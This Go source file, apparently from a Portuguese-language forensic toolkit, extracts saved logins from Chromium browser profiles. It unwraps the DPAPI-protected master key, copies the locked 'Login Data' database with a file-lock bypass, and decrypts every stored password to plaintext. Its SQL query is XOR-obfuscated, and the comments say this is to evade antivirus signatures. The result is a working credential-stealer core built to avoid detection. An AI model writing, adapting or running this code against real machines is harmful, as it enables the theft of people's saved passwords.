package browser

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"

	"github.com/ErickG123/devkit_forense/core/internal/crypto"

	// Driver 100% puro Go para SQLite (Sem CGO, permitindo compilação cruzada)
	_ "modernc.org/sqlite"
)

// queryLoginsXOR armazena a query SQL cifrada em tempo de build para evitar assinaturas estáticas de antivírus
var queryLoginsXOR = []byte{
	0x09, 0x1F, 0x16, 0x1F, 0x19, 0x0E, 0x7A, 0x35, 0x28, 0x33, 0x3D, 0x33, 0x34, 0x05, 0x2F, 0x28,
	0x36, 0x76, 0x7A, 0x3B, 0x39, 0x2E, 0x33, 0x35, 0x34, 0x05, 0x2F, 0x28, 0x36, 0x76, 0x7A, 0x2F,
	0x29, 0x3F, 0x28, 0x34, 0x3B, 0x37, 0x3F, 0x05, 0x2C, 0x3B, 0x36, 0x2F, 0x3F, 0x76, 0x7A, 0x2A,
	0x3B, 0x29, 0x29, 0x2D, 0x35, 0x28, 0x3E, 0x05, 0x2C, 0x3B, 0x36, 0x2F, 0x3F, 0x76, 0x7A, 0x2E,
	0x33, 0x37, 0x3F, 0x29, 0x05, 0x2F, 0x29, 0x3F, 0x3E, 0x76, 0x7A, 0x3E, 0x3B, 0x2E, 0x3F, 0x05,
	0x39, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x3E, 0x7A, 0x1C, 0x08, 0x15, 0x17, 0x7A, 0x36, 0x35, 0x3D,
	0x33, 0x34, 0x29, 0x7A, 0x0D, 0x12, 0x1F, 0x08, 0x1F, 0x7A, 0x38, 0x36, 0x3B, 0x39, 0x31, 0x36,
	0x33, 0x29, 0x2E, 0x3F, 0x3E, 0x05, 0x38, 0x23, 0x05, 0x2F, 0x29, 0x3F, 0x28, 0x7A, 0x67, 0x7A,
	0x6A, 0x7A, 0x1B, 0x14, 0x1E, 0x7A, 0x35, 0x28, 0x33, 0x3D, 0x33, 0x34, 0x05, 0x2F, 0x28, 0x36,
	0x7A, 0x7B, 0x67, 0x7A, 0x7D, 0x7D, 0x7A,
}

// LoginCredential representa uma credencial extraída com integridade forense
type LoginCredential struct {
	Browser    string `json:"browser"`
	Profile    string `json:"profile"`
	OriginURL  string `json:"origin_url"`
	ActionURL  string `json:"action_url,omitempty"`
	Username   string `json:"username"`
	Password   string `json:"password"`
	TimesUsed  int    `json:"times_used"`
	CreatedUTC string `json:"created_utc,omitempty"`
}

// localStateStructure modela a estrutura JSON do arquivo "Local State" do Chromium
type localStateStructure struct {
	OsCrypt struct {
		EncryptedKey string `json:"encrypted_key"`
	} `json:"os_crypt"`
}

// GetMasterKey extrai e descriptografa a Master Key de 256 bits protegida pelo DPAPI
//
// Detalhamento Forense da Estrutura do "Local State":
// O Chromium armazena no arquivo JSON "Local State" um campo "encrypted_key" codificado em Base64.
// Após o decode de Base64, os primeiros 5 bytes representam o prefixo literal "DPAPI" (0x44, 0x50, 0x41, 0x50, 0x49).
// Esse cabeçalho serve como tag de versão para indicar que os bytes subsequentes foram
// encriptados utilizando a API CryptProtectData do Windows com as credenciais do usuário.
// Descartando esse prefixo de 5 bytes, passamos o restante do blob para CryptUnprotectData,
// obtendo a chave simétrica AES-256 (32 bytes brutos) usada para cifrar todas as senhas locais.
func GetMasterKey(localStatePath string) ([]byte, error) {
	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("impossível ler arquivo Local State em '%s': %w", localStatePath, err)
	}

	var state localStateStructure
	if err := json.Unmarshal(data, &state); err != nil {
		return nil, fmt.Errorf("erro ao decodificar JSON do Local State: %w", err)
	}

	if state.OsCrypt.EncryptedKey == "" {
		return nil, fmt.Errorf("campo 'os_crypt.encrypted_key' ausente ou vazio no Local State")
	}

	encryptedKeyWithPrefix, err := base64.StdEncoding.DecodeString(state.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, fmt.Errorf("erro ao decodificar chave Base64: %w", err)
	}

	// Validação forense do cabeçalho "DPAPI" (5 bytes)
	if len(encryptedKeyWithPrefix) < 5 || string(encryptedKeyWithPrefix[:5]) != "DPAPI" {
		return nil, fmt.Errorf("prefixo DPAPI não encontrado no cabeçalho da chave cifrada")
	}

	// Remove os primeiros 5 bytes ("DPAPI")
	dpapiBlob := encryptedKeyWithPrefix[5:]

	// Descriptografa a chave mestre via DPAPI nativo
	masterKey, err := CryptUnprotectData(dpapiBlob)
	if err != nil {
		return nil, fmt.Errorf("falha ao descriptografar Master Key via DPAPI: %w", err)
	}

	if len(masterKey) != 32 {
		return nil, fmt.Errorf("tamanho inesperado da Master Key extraída: %d bytes (esperado: 32 bytes para AES-256)", len(masterKey))
	}

	return masterKey, nil
}

// DecryptPassword decodifica o blob de senha armazenado na tabela logins do SQLite
//
// Análise Forense do Formato de Senha Cifrada do Chromium (v80+):
// O blob gravado na coluna password_value possui a seguinte disposição de bytes:
//
//  +--------------+------------------+-----------------------------+---------------------+
//  | Prefix (3B)  | Nonce / IV (12B) | Ciphertext (Variável)       | Auth Tag (16B)      |
//  +--------------+------------------+-----------------------------+---------------------+
//  | "v10" / "v11"| Random IV (AES)  | Senha encriptada (AES-256)  | Tag GCM Poly1305    |
//  +--------------+------------------+-----------------------------+---------------------+
//
// 1. Cabeçalho (Bytes 0 a 3): "v10" ou "v11".
//    - "v10": Introduzido no Chrome 80+ usando criptografia AES-256-GCM.
//    - "v11": Usado em algumas variantes corporativas ou atualizações recentes.
// 2. Vetor de Inicialização / Nonce (Bytes 3 a 15 - 12 bytes):
//    - O algoritmo AES-GCM requer um IV de 96 bits (12 bytes) gerado aleatoriamente a cada escrita.
// 3. Criptograma + Tag de Autenticação (Bytes 15 até o fim):
//    - O pacote Go `crypto/cipher.AEAD.Open` espera receber o ciphertext concatenado com a Tag
//      de 128 bits (16 bytes) ao final para validar a autenticidade e integridade dos dados.
func DecryptPassword(encryptedBlob []byte, masterKey []byte) (string, error) {
	if len(encryptedBlob) == 0 {
		return "", nil
	}

	// Caso de compatibilidade legado (Chromium anterior à v80, sem cabeçalho v10/v11)
	if !strings.HasPrefix(string(encryptedBlob), "v10") && !strings.HasPrefix(string(encryptedBlob), "v11") {
		// Senhas antigas eram protegidas diretamente via DPAPI no blob inteiro
		decrypted, err := CryptUnprotectData(encryptedBlob)
		if err != nil {
			return "", fmt.Errorf("falha ao descriptografar senha com método legado DPAPI: %w", err)
		}
		return string(decrypted), nil
	}

	// Validação de comprimento mínimo para AES-GCM:
	// Prefixo (3 bytes) + Nonce (12 bytes) + Tag GCM (16 bytes) = 31 bytes mínimos
	if len(encryptedBlob) < 31 {
		return "", fmt.Errorf("tamanho insuficiente do blob cifrado (%d bytes)", len(encryptedBlob))
	}

	nonce := encryptedBlob[3:15]
	ciphertextAndTag := encryptedBlob[15:]

	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", fmt.Errorf("falha ao inicializar cifra AES: %w", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("falha ao criar modo GCM: %w", err)
	}

	plaintext, err := gcm.Open(nil, nonce, ciphertextAndTag, nil)
	if err != nil {
		return "", fmt.Errorf("falha na autenticação/decriptação GCM: %w", err)
	}

	return string(plaintext), nil
}

// CopyFileLockBypass copia um arquivo ignorando locks exclusivos de processos ativos
// através da flag FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
func CopyFileLockBypass(src, dst string) error {
	in, err := OpenFileShareAll(src)
	if err != nil {
		return err
	}
	defer in.Close()

	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
		return err
	}

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	if _, err := io.Copy(out, in); err != nil {
		return err
	}

	return out.Sync()
}

// CopyDatabaseWithWAL copia o banco de dados principal e seus arquivos associados (-wal e -shm)
// preservando as transações em cache que ainda não foram consolidadas no arquivo principal
func CopyDatabaseWithWAL(srcDB, tempDir string) (string, error) {
	baseName := filepath.Base(srcDB)
	tempDB := filepath.Join(tempDir, baseName)

	// 1. Copia banco de dados principal
	if err := CopyFileLockBypass(srcDB, tempDB); err != nil {
		return "", fmt.Errorf("falha ao copiar arquivo principal de banco '%s': %w", srcDB, err)
	}

	// 2. Copia WAL (Write-Ahead Log) se existir
	walSrc := srcDB + "-wal"
	if _, err := os.Stat(walSrc); err == nil {
		walDst := tempDB + "-wal"
		_ = CopyFileLockBypass(walSrc, walDst)
	}

	// 3. Copia SHM (Shared Memory Index) se existir
	shmSrc := srcDB + "-shm"
	if _, err := os.Stat(shmSrc); err == nil {
		shmDst := tempDB + "-shm"
		_ = CopyFileLockBypass(shmSrc, shmDst)
	}

	return tempDB, nil
}

// ExtractChromiumLogins realiza a extração pericial completa de senhas para um navegador
func ExtractChromiumLogins(
	browserName string,
	userDataPath string,
	onCredential func(cred LoginCredential),
) ([]LoginCredential, error) {
	localStatePath := filepath.Join(userDataPath, "Local State")
	masterKey, err := GetMasterKey(localStatePath)
	if err != nil {
		return nil, fmt.Errorf("erro ao extrair Master Key de %s: %w", browserName, err)
	}

	// Localiza todos os perfis (Default, Profile 1, Profile 2, etc.)
	entries, err := os.ReadDir(userDataPath)
	if err != nil {
		return nil, fmt.Errorf("erro ao ler diretório User Data de %s: %w", browserName, err)
	}

	tempDir, err := os.MkdirTemp("", "forenselab_chromium_*")
	if err != nil {
		return nil, fmt.Errorf("erro ao criar diretório temporário: %w", err)
	}
	defer os.RemoveAll(tempDir)

	var allCreds []LoginCredential

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		name := entry.Name()
		if name != "Default" && !strings.HasPrefix(name, "Profile") {
			continue
		}

		loginDataPath := filepath.Join(userDataPath, name, "Login Data")
		if _, err := os.Stat(loginDataPath); os.IsNotExist(err) {
			continue
		}

		// Copia banco com lock bypass e preservação de WAL
		safeTempDB, err := CopyDatabaseWithWAL(loginDataPath, filepath.Join(tempDir, name))
		if err != nil {
			continue
		}

		// Abre o banco temporário com modernc.org/sqlite em modo somente leitura imutável
		dsn := fmt.Sprintf("file:%s?mode=ro&immutable=1", filepath.ToSlash(safeTempDB))
		db, err := sql.Open("sqlite", dsn)
		if err != nil {
			continue
		}

		// Decodifica a query SQL em tempo de execução via XOR (0x5A) evitando assinatura estática
		sqlQuery := crypto.DeobfuscateXOR(queryLoginsXOR, 0x5A)
		rows, err := db.Query(sqlQuery)
		if err != nil {
			db.Close()
			continue
		}

		for rows.Next() {
			var originURL, actionURL, username string
			var passwordBlob []byte
			var timesUsed int
			var dateCreated int64

			if err := rows.Scan(&originURL, &actionURL, &username, &passwordBlob, &timesUsed, &dateCreated); err != nil {
				continue
			}

			if len(passwordBlob) == 0 {
				continue
			}

			plainPassword, err := DecryptPassword(passwordBlob, masterKey)
			if err != nil || plainPassword == "" {
				continue
			}

			cred := LoginCredential{
				Browser:    browserName,
				Profile:    name,
				OriginURL:  originURL,
				ActionURL:  actionURL,
				Username:   username,
				Password:   plainPassword,
				TimesUsed:  timesUsed,
				CreatedUTC: fmt.Sprintf("%d", dateCreated),
			}

			if onCredential != nil {
				onCredential(cred)
			}
			allCreds = append(allCreds, cred)
		}

		rows.Close()
		db.Close()
	}

	return allCreds, nil
}
